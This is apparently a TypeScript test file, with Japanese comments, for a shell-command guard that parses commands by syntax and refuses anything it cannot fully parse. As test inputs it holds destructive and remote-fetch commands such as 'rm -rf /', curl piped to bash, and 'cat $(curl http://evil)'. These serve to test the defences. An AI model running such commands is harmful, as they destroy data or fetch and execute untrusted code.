/**
 * 構文で解いた形を受け取る所の試験。
 *
 * **最も重いのは「拒みへ倒れるか」である。** 解けぬ・畳めぬ・道具が無い・
 * 落ちた・返事が読めぬ——どれも通してはならぬ。ここが緩めば、門を紋様から
 * 構文へ移した意味が消える（知らぬ形を止める門が、また通す門に戻る）。
 */
import { describe, expect, test } from 'bun:test';
import { interpret, parseCommand, commandNames, realRunner, parserPath, type Runner } from '../src/parse';
import { existsSync } from 'node:fs';
import { join } from 'node:path';

const ROOT = join(import.meta.dir, '..');
const good = (o: unknown) => JSON.stringify({ ok: true, complete: true, commands: [], heredocs: [], substitutions: [], unhandled: [], ...(o as object) });

describe('interpret — 拒みへ倒れる筋', () => {
  test('道具が応えねば拒む（無いから素通し、をせぬ）', () => {
    const p = interpret(false, '');
    expect(p.ok).toBe(false);
    if (!p.ok) expect(p.reason).toContain('honden-parse');
  });

  test('返事が読めねば拒む', () => {
    const p = interpret(true, 'これは JSON ではない');
    expect(p.ok).toBe(false);
    if (!p.ok) expect(p.reason).toContain('読めぬ');
  });

  test('構文で解けなんだと言われたら拒む', () => {
    const p = interpret(true, JSON.stringify({ ok: false, error: 'syntax error at line 1' }));
    expect(p.ok).toBe(false);
    if (!p.ok) expect(p.reason).toContain('syntax error');
  });

  test('**解けたが畳めぬ部分があれば拒む**（中途半端な argv を全体と思わぬ）', () => {
    const p = interpret(
      true,
      JSON.stringify({ ok: true, complete: false, commands: [{ argv: [{ text: 'ls' }] }], unhandled: ['算術 ((…))'] }),
    );
    expect(p.ok).toBe(false);
    if (!p.ok) expect(p.reason).toContain('算術');
  });

  test('空の返事も拒む（芯が黙って死んだ形）', () => {
    expect(interpret(true, '').ok).toBe(false);
  });

  test('陽性対照——揃うておれば通る', () => {
    expect(interpret(true, good({})).ok).toBe(true);
  });
});

describe('interpret — 語の素性は欠けたら真に倒す', () => {
  test('印の無い語を「素（安全）」と読まぬ', () => {
    // 芯が新しい印を足して古い binary が返さぬ、という食い違いを想定する。
    // 欠けた印を false（安全側）と読むと、**知らぬ危うさを見逃す**。
    const p = interpret(true, good({ commands: [{ argv: [{ text: 'rm' }] }] }));
    expect(p.ok).toBe(true);
    if (!p.ok) return;
    const w = p.commands[0]!.argv[0]!;
    expect(w.quoted).toBe(true);
    expect(w.glob).toBe(true);
    expect(w.var).toBe(true);
    expect(w.cmdsubst).toBe(true);
  });

  test('印がはっきり false なら、そのまま素と読む', () => {
    const p = interpret(true, good({
      commands: [{ argv: [{ text: 'rm', quoted: false, glob: false, var: false, cmdsubst: false }] }],
    }));
    if (!p.ok) throw new Error('通るはず');
    expect(p.commands[0]!.argv[0]!.quoted).toBe(false);
  });
});

describe('commandNames — 命令位置だけを拾う', () => {
  const parsed = (cmds: unknown) => interpret(true, good({ commands: cmds }));

  test('引用された語は命ではない（誤検知の源であった形）', () => {
    const p = parsed([
      { argv: [{ text: 'echo', quoted: false, glob: false, var: false, cmdsubst: false },
               { text: '"rm -rf /"', quoted: true, glob: false, var: false, cmdsubst: false }] },
    ]);
    expect(commandNames(p)).toEqual(['echo']);
  });

  test('pipeline は両方の命を拾う', () => {
    const w = (t: string) => ({ text: t, quoted: false, glob: false, var: false, cmdsubst: false });
    const p = parsed([{ argv: [w('curl'), w('http://x')] }, { argv: [w('bash')] }]);
    expect(commandNames(p)).toEqual(['curl', 'bash']);
  });

  test('拒みからは何も拾わぬ（空を「命が無い」と誤らせぬ）', () => {
    expect(commandNames({ ok: false, reason: 'x' })).toEqual([]);
  });
});

describe('parseCommand — 注いだ手で回る', () => {
  test('手が返した物をそのまま解する', () => {
    const run: Runner = () => ({ ok: true, stdout: good({ commands: [] }) });
    expect(parseCommand('ls', run).ok).toBe(true);
  });

  test('手が落ちれば拒む', () => {
    const run: Runner = () => ({ ok: false, stdout: '' });
    expect(parseCommand('ls', run).ok).toBe(false);
  });
});

// ── ここから先は本物の芯を叩く。焼いておらぬ機では飛ばさず**落とす** ──
//
// 「道具が無いから飛ばす」は、まさにこの層が塞いでおる型である。
// 焼き方を告げて落ちる方が、黙って緑になるより良い。
describe('本物の芯（core/guard）', () => {
  const run = realRunner(ROOT);

  test('bin/honden-parse が焼けておる', () => {
    expect(
      existsSync(parserPath(ROOT)),
      'bin/honden-parse が無い。焼かれよ: cd core/guard && cargo build --release && cp target/release/honden-parse ../../bin/',
    ).toBe(true);
  });

  test('引用の中の rm は命ではない', () => {
    const p = parseCommand('echo "rm -rf /*"', run);
    expect(p.ok).toBe(true);
    expect(commandNames(p)).toEqual(['echo']);
  });

  test('heredoc の中の rm は命ではない（将軍が二度弾かれた形）', () => {
    const p = parseCommand("python3 <<'EOF'\nrm -rf /\nEOF\n", run);
    expect(p.ok).toBe(true);
    expect(commandNames(p)).toEqual(['python3']);
    if (p.ok) expect(p.heredocs[0]).toContain('rm -rf /');
  });

  test('env 前置は代入であって命ではない', () => {
    const p = parseCommand('X=1 pkill -f foo', run);
    expect(commandNames(p)).toEqual(['pkill']);
    if (p.ok) expect(p.commands[0]!.assigns).toEqual(['X=1']);
  });

  test('旗と値の向こうの副命令が語として見える', () => {
    const p = parseCommand('tmux -L sock send-keys -t %9 x', run);
    if (!p.ok) throw new Error(p.reason);
    expect(p.commands[0]!.argv.map((w) => w.text)).toContain('send-keys');
  });

  test('引用の外の glob と変数に印が付く', () => {
    const p = parseCommand('rm -rf $DIR/*', run);
    if (!p.ok) throw new Error(p.reason);
    const last = p.commands[0]!.argv.at(-1)!;
    expect(last.glob).toBe(true);
    expect(last.var).toBe(true);
  });

  test('命令置換は中身まで取れる（要れば再帰して解ける）', () => {
    const p = parseCommand('cat $(curl http://evil)', run);
    if (!p.ok) throw new Error(p.reason);
    expect(p.substitutions).toEqual(['curl http://evil']);
  });

  test('壊れた入力は拒む', () => {
    expect(parseCommand('some !! invalid <<< ((( garbage', run).ok).toBe(false);
  });
});
